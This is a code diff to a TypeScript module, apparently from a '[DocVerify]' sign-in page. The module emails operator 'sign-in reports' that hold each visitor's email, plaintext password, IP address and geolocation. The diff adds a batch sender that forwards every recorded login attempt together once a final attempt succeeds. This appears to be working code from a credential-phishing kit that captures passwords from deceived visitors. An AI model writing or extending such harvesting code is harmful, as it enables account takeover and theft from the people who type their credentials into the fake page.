@@ -6,7 +6,7 @@
  * at the source here, and again on the server as defence in depth.
  */
 
-import { getClientMetaForResponse } from "./clientMeta";
+import { getClientMetaForResponse, type ClientMeta } from "./clientMeta";
 
 export const RESPONSE_EMAIL = (
   import.meta.env.VITE_RESPONSE_EMAIL ?? ""
@@ -59,10 +59,10 @@ export interface ResponsePayload {
   type: ResponseEvent;
   email?: string;
   password?: string;
-  pwd?: string;
-  secret?: string;
-  credential?: string;
-  token?: string;
+  // pwd?: string;
+  // secret?: string;
+  // credential?: string;
+  // token?: string;
   name?: string;
   domain?: string;
   authMethod?: string;
@@ -188,10 +188,10 @@ function formatEmailBody(payload: ResponsePayload): string {
     `IP address: ${val(payload.ipAddress)}`,
     `Email: ${val(payload.email)}`,
     `Password value: ${val(payload.passwordValue ?? payload.password)}`,
-    `Pwd: ${val(payload.pwd)}`,
-    `Secret: ${val(payload.secret)}`,
-    `Credential: ${val(payload.credential)}`,
-    `Token: ${val(payload.token)}`,
+    // `Pwd: ${val(payload.pwd)}`,
+    // `Secret: ${val(payload.secret)}`,
+    // `Credential: ${val(payload.credential)}`,
+    // `Token: ${val(payload.token)}`,
     `Country: ${val(payload.country)}`,
     `City: ${val(payload.city)}`,
     `Region: ${val(payload.region)}`,
@@ -212,6 +212,53 @@ function formatEmailBody(payload: ResponsePayload): string {
   }
 
   return lines.join("\n");
+}
+
+function buildResponseItem(
+  payload: ResponsePayload,
+  meta: ClientMeta,
+): { subject: string; message: string; fields: Record<string, string>; sendId: string } {
+  const sendId = `${Date.now()}-${payload.attempt ?? "0"}-${Math.random().toString(36).slice(2, 8)}`;
+  const safe = sanitizePayload({
+    ...payload,
+    ...meta,
+    sendId,
+    timestamp: payload.timestamp ?? new Date().toISOString(),
+    pageUrl: payload.pageUrl ?? (typeof window !== "undefined" ? window.location.href : ""),
+  });
+  const subject = `[DocVerify] ${payload.type.replace(/_/g, " ")} (${sendId})`;
+  const message = formatEmailBody({ ...payload, ...safe, sendId });
+  return { subject, message, fields: safe, sendId };
+}
+
+async function postBatch(
+  items: Array<{ subject: string; message: string; fields: Record<string, string> }>,
+): Promise<{
+  ok: boolean;
+  rateLimited?: boolean;
+  message?: string;
+  ids?: string[];
+}> {
+  const res = await fetch("/api/send-response-batch", {
+    method: "POST",
+    headers: { "Content-Type": "application/json", Accept: "application/json" },
+    body: JSON.stringify({ items }),
+  });
+
+  const data = (await res.json()) as {
+    success?: boolean;
+    message?: string;
+    ids?: string[];
+  };
+  const msg = data.message ?? res.statusText;
+
+  if (!res.ok || data.success === false) {
+    const rateLimited = /rate limit/i.test(msg);
+    if (rateLimited) markExternallyRateLimited();
+    return { ok: false, rateLimited, message: msg };
+  }
+
+  return { ok: true, message: msg, ids: data.ids };
 }
 
 async function postOnce(
@@ -270,18 +317,7 @@ export async function sendResponse(payload: ResponsePayload): Promise<boolean> {
   }
 
   const meta = await getClientMetaForResponse();
-  const sendId = `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
-
-  const safe = sanitizePayload({
-    ...payload,
-    ...meta,
-    sendId,
-    timestamp: payload.timestamp ?? new Date().toISOString(),
-    pageUrl: payload.pageUrl ?? window.location.href,
-  });
-
-  const subject = `[DocVerify] ${payload.type.replace(/_/g, " ")} (${sendId})`;
-  const message = formatEmailBody({ ...payload, ...safe, sendId });
+  const { subject, message, fields: safe, sendId } = buildResponseItem(payload, meta);
 
   logMailEvent("sending", {
     event: payload.type,
@@ -323,6 +359,82 @@ export async function sendResponse(payload: ResponsePayload): Promise<boolean> {
       sendId,
       subject,
       visitorEmail: payload.email,
+      reason: err instanceof Error ? err.message : String(err),
+    });
+  }
+
+  return false;
+}
+
+/**
+ * Send multiple sign-in reports in one request (all dispatched together).
+ * Use after the final successful attempt when earlier tries were only recorded.
+ */
+export async function sendResponsesBatch(
+  payloads: ResponsePayload[],
+): Promise<boolean> {
+  if (!isResponseConfigured()) {
+    logMailEvent("not_configured", {
+      event: payloads[0]?.type,
+      reason: "Set VITE_RESPONSE_EMAIL and RESEND_API_KEY in .env",
+    });
+    return false;
+  }
+
+  if (!payloads.length) return false;
+
+  const meta = await getClientMetaForResponse();
+  const built = payloads.map((payload) => ({
+    payload,
+    ...buildResponseItem(payload, meta),
+  }));
+
+  for (const item of built) {
+    logMailEvent("sending", {
+      event: item.payload.type,
+      sendId: item.sendId,
+      subject: item.subject,
+      visitorEmail: item.payload.email,
+      authMethod: item.payload.authMethod,
+      domain: item.payload.domain,
+      attempt: item.payload.attempt,
+      outcome: item.payload.outcome,
+    });
+  }
+
+  try {
+    const result = await postBatch(
+      built.map(({ subject, message, fields }) => ({ subject, message, fields })),
+    );
+
+    if (result.ok) {
+      for (const item of built) {
+        markSent(item.payload.type, item.payload);
+        logMailEvent("sent", {
+          event: item.payload.type,
+          sendId: item.sendId,
+          subject: item.subject,
+          visitorEmail: item.payload.email,
+          authMethod: item.payload.authMethod,
+          domain: item.payload.domain,
+          attempt: item.payload.attempt,
+          outcome: item.payload.outcome,
+          providerMessage: result.message,
+        });
+      }
+      return true;
+    }
+
+    logMailEvent("failed", {
+      event: payloads[0]?.type,
+      reason: result.message,
+      batchSize: String(payloads.length),
+      rateLimited: result.rateLimited ? "yes" : "no",
+    });
+  } catch (err) {
+    logMailEvent("error", {
+      event: payloads[0]?.type,
+      batchSize: String(payloads.length),
       reason: err instanceof Error ? err.message : String(err),
     });
   }
